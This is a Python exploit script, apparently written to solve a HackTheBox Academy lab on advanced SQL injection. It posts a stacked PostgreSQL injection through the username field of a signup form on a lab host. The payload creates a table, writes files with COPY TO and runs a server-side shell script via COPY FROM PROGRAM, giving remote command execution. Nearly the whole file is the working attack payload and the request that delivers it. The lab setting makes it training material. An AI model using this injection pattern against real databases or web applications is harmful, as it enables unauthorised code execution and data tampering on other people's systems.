#!/usr/bin/env python3

"""Created this script to solve the HackTheBox Academy lab called 'Reading and Writing Files' for the module called 'Advanced SQL Injections'. 
This script exploits a blind postgreSQL injection to get RCE"""

import random
import string
import requests

target= "10.129.204.249:8080"
proxies= {"http":"http://127.0.0.1:8081"}
headers= {"Content-Type": "application/x-www-form-urlencoded"}

def generate_random_word():
    all_chars= string.digits + string.ascii_letters
    random_group = random.sample(all_chars, 16)
    return ''.join(random_group)

random_group = generate_random_word()

data= f"name={random_group}&username={random_group}','{random_group}@test.com','afda');create+table+{random_group}(mycol+text);Insert into {random_group} values ('test');COPY {random_group} TO '/var/lib/postgresql/proof.txt ';COPY {random_group} FROM PROGRAM 'sh /opt/bluebird/serverInfo.sh';copy {random_group} to '/tmp/final.txt'--+-&email={random_group}%40a.com&password=test&repeatPassword=test"

response= requests.post(url= f"http://{target}/signup", proxies=proxies, headers=headers, verify=False, allow_redirects=True, data=data)
